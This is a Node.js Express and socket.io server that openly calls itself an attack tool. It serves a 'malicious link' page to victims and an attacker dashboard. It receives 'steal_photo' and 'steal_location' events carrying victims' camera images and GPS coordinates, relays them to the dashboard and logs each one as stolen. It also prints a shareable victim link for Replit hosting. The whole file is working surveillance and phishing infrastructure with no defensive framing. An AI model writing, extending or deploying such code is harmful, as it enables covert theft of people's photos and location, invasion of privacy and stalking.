const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let photoCount = 0;

io.on('connection', (socket) => {
    console.log('Victim connected');
    
    socket.on('steal_photo', (data) => {
        photoCount++;
        io.emit('new_photo', data);
        console.log(`Photo ${photoCount} stolen`);
    });
    
    socket.on('steal_location', (data) => {
        io.emit('new_location', data);
        console.log('Location stolen:', data.lat, data.lng);
    });
});

// Attacker dashboard
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Malicious link (root URL)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🔴 Server running`);
    console.log(`📱 Victim link: ${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : `http://localhost:${PORT}`}`);
    console.log(`🕹️ Dashboard: ${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co/dashboard` : `http://localhost:${PORT}/dashboard`}`);
});
